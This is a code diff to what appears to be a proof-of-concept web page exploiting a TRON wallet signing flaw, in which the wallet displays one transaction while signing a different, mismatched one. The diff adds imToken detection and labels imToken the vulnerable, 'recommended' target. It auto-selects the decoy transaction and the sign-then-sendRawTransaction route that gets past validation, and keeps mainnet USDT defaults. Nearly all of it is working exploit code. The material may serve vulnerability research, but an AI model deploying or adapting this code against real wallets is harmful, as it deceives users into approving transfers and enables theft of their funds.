@@ -46,7 +46,7 @@
       h1 { margin-bottom: 0; font-size: clamp(28px, 4vw, 46px); line-height: 1; }
       h2 { margin-bottom: 0; font-size: 18px; }
       h3 { margin-bottom: 10px; font-size: 14px; }
-      .status { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin-bottom: 14px; }
+      .status { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 12px; margin-bottom: 14px; }
       .status div, .panel { border: 1px solid var(--line); border-radius: 8px; background: var(--card); }
       .status div { min-width: 0; padding: 12px 14px; }
       .status span { display: block; margin-bottom: 4px; color: var(--muted); font-size: 12px; }
@@ -162,6 +162,7 @@
         <div><span>Provider</span><strong id="providerStatus">not detected</strong></div>
         <div><span>Account</span><strong id="accountStatus">not connected</strong></div>
         <div><span>Network</span><strong id="networkStatus">unknown</strong></div>
+        <div><span>Wallet</span><strong id="walletStatus">unknown</strong></div>
       </section>
 
       <section class="grid">
@@ -191,10 +192,10 @@
           <label class="mt">
             Wallet route
             <select id="signRoute">
-              <option value="tronWebSignAndSend">tronWeb.trx.sign() → sendRawTransaction ⚠️</option>
+              <option value="tronWebSignAndSend">tronWeb.trx.sign() → sendRawTransaction ✅ imToken推荐</option>
               <option value="tronWebSend">tronWeb.trx.sendTransaction(tx) — vulnerable path ⚠️</option>
               <option value="requestSign">provider.request tron_signTransaction</option>
-              <option value="tronWebSign">tronWeb.trx.sign(transaction) — patched, returns {}</option>
+              <option value="tronWebSign">tronWeb.trx.sign(transaction) — TronLink patched, returns {}</option>
               <option value="requestSend">provider.request tron_sendTransaction</option>
               <option value="providerSend">provider.sendTransaction(transaction)</option>
             </select>
@@ -266,6 +267,7 @@
         tronWeb: null,
         account: "",
         network: "unknown",
+        isImToken: false,
         detections: [],
         decoyTx: null,
         actualTx: null,
@@ -352,6 +354,7 @@
 
         state.tronWeb = w.tron?.tronWeb || w.tronWeb || w.tronLink?.tronWeb || state.provider?.tronWeb || null;
         state.account = state.tronWeb?.defaultAddress?.base58 || state.provider?.selectedAddress || state.provider?.address || "";
+        state.isImToken = !!(w.imToken) && !!w.tronWeb;
         state.network = detectNetwork();
         applyDefaults();
         render();
@@ -373,10 +376,28 @@
         }
         if (/nile/i.test(state.network) && !$("tokenContract").value.trim()) $("tokenContract").value = NILE_USDT;
         if (/^mainnet/i.test(state.network) && !$("tokenContract").value.trim()) $("tokenContract").value = MAINNET_USDT;
+        if (state.isImToken) {
+          if ($("decoyType").value !== "manualTransfer") $("decoyType").value = "manualTransfer";
+          if ($("signRoute").value === "tronWebSend") $("signRoute").value = "tronWebSignAndSend";
+          $("decoyToLabel").style.display = "";
+          $("decoyTrxLabel").style.display = "";
+          $("decoyAmountLabel").style.display = "none";
+        }
       }
 
       async function connectWallet() {
         detectProviders();
+        if (state.isImToken) {
+          const tw = window.tronWeb;
+          if (tw?.ready && tw?.defaultAddress?.base58) {
+            state.account = tw.defaultAddress.base58;
+            applyDefaults();
+            render();
+            log("imToken: tronWeb already ready, account loaded", { account: state.account });
+            return;
+          }
+          throw new Error("imToken detected but tronWeb not ready. Open this DApp from within imToken.");
+        }
         const targets = [state.provider, window.tron, window.tronLink, state.tronWeb].filter(Boolean);
         let lastError = null;
         for (const target of targets) {
@@ -550,11 +571,15 @@
         if (route === "tronWebSignAndSend") {
           if (!state.tronWeb?.trx?.sign) throw new Error("tronWeb.trx.sign is unavailable.");
           if (!state.tronWeb?.trx?.sendRawTransaction) throw new Error("tronWeb.trx.sendRawTransaction is unavailable.");
-          log("Step 1 — Calling tronWeb.trx.sign (popup shows raw_data)", { txID: tx.txID, rawDataType: tx.raw_data?.contract?.[0]?.type });
+          const walletLabel = state.isImToken ? "imToken" : "wallet";
+          log(`Step 1 — tronWeb.trx.sign() popup (${walletLabel} shows raw_data, signs raw_data_hex — no consistency check)`, { txID: tx.txID, rawDataType: tx.raw_data?.contract?.[0]?.type });
           const signed = normalizeSignedResult(await state.tronWeb.trx.sign(tx));
           log("sign() returned", signed);
-          if (!signed?.signature?.length) throw new Error("sign() returned no signature — TronLink rejected the mismatch at sign stage.");
-          log("Step 2 — Broadcasting via sendRawTransaction (bypasses sendTransaction validation)", { txID: signed.txID });
+          if (!signed?.signature?.length) {
+            const hint = state.isImToken ? "" : " (TronLink may have rejected the mismatch at sign stage)";
+            throw new Error("sign() returned no signature." + hint);
+          }
+          log("Step 2 — Broadcasting via tronWeb.trx.sendRawTransaction", { txID: signed.txID });
           result = await state.tronWeb.trx.sendRawTransaction(signed);
         } else if (route === "tronWebSend") {
           if (!state.tronWeb?.trx?.sendTransaction) throw new Error("tronWeb.trx.sendTransaction is unavailable.");
@@ -720,6 +745,17 @@
         $("providerStatus").textContent = providerLabel;
         $("accountStatus").textContent = state.account || "not connected";
         $("networkStatus").textContent = state.network || "unknown";
+        const walletEl = $("walletStatus");
+        if (state.isImToken) {
+          walletEl.textContent = "imToken (vulnerable path)";
+          walletEl.style.color = "var(--warn)";
+        } else if (state.detections.some(d => /tronlink/i.test(d.name))) {
+          walletEl.textContent = "TronLink (patched)";
+          walletEl.style.color = "";
+        } else {
+          walletEl.textContent = state.detections.length ? "unknown wallet" : "not detected";
+          walletEl.style.color = "";
+        }
         const isMainnet = /^mainnet/i.test(state.network);
         $("mainnetBanner").classList.toggle("visible", isMainnet);
         $("decoySummary").textContent = state.mismatchedTx ? summarizeRaw(state.mismatchedTx.raw_data) : "Build a transaction first.";
